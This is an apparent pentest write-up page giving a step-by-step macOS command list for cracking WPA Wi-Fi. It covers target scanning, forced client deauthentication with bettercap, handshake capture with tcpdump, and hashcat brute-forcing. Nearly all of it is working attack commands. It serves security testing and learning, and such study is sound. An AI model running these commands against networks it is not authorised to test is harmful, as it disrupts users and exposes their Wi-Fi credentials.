<!DOCTYPE html>
<html>
<head>
  <title>V0RT3XM | Write-ups</title>
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
  <link rel="manifest" href="/site.webmanifest">
  <style>
    table, th, td {
    border: 1px solid black;
    border-collapse: collapse;
  }
</style>
</head>
<body>

<h1>Wifi Pentest for Apple Silicon</h1>

<h2>Install Tools</h2>
<ul>
  <li><code>brew install aircrack-ng</code></li>
  <li><code>sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport</code></li>
  <li><code>git clone https://github.com/hashcat/hashcat-utils.git; cd hashcat-utils/src; gcc -o cap2hccapx cap2hccapx.c; sudo mv ./cap2hccapx /usr/local/bin/</code></li>
  <li><code>brew install wireshark</code></li>
  <li><code>brew install bettercap</code></li>
  <li><a href="https://hashcat.net/cap2hashcat/">cap2hashcat</a></li>
</ul>

<h2>Identify Target</h2>
<ol>
  <li><code>sudo airport -s</code></li>
  <li><code>export BSSID=&lt;BSSID Target&gt;</code></li>
  <li><code>sudo airport -z</code></li>
</ol> 

<h2>Capturing Trafic</h2>
<ol>
  <li><code>sudo airport -z</code></li>
  <li><code>sudo airport -c1</code></li>
  <li><code>export BSSID=&lt;BSSID Target&gt;; sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i en0 -w beacon.cap</code></li>
  <li><code>sudo bettercap -iface en0</code>
  	<ol>
  		<li><code>wifi.recon on</code></li>
  		<li><code>wifi.deauth &lt;BSSID Target&gt;</code>, 4 times or more</li>
	</ol>
  </li>
  <li><code>export BSSID=&lt;BSSID Target&gt;; sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i en0 -w handshake.cap</code>, wait until see some frames like <code>Got 19</code></li>
  <li><code>Control + c</code></li>
</ol> 

<h2>Brutforce</h2>
<ol>
  <li>Convert cap file to hash using cap2hashcat</li>
  <li><code>hashcat -m 22000 2367335_1708921245.hc22000 SecLists/Passwords/scraped-JWT-secrets.txt</code></li>
  <li><code>hashcat -m 22000 -a3 2367335_1708921245.hc22000 "?d?d?d?d?d?d?d?d?d"</code></li>
  <li>Command before <code>--show</code></li>
</ol> 

<h2>Reference</h2>
<a href="https://gainanov.pro/eng-blog/sysad/wifi-cracking/">Hacking. Wi-Fi Penetration on MacOS</a>

</body>
</html>
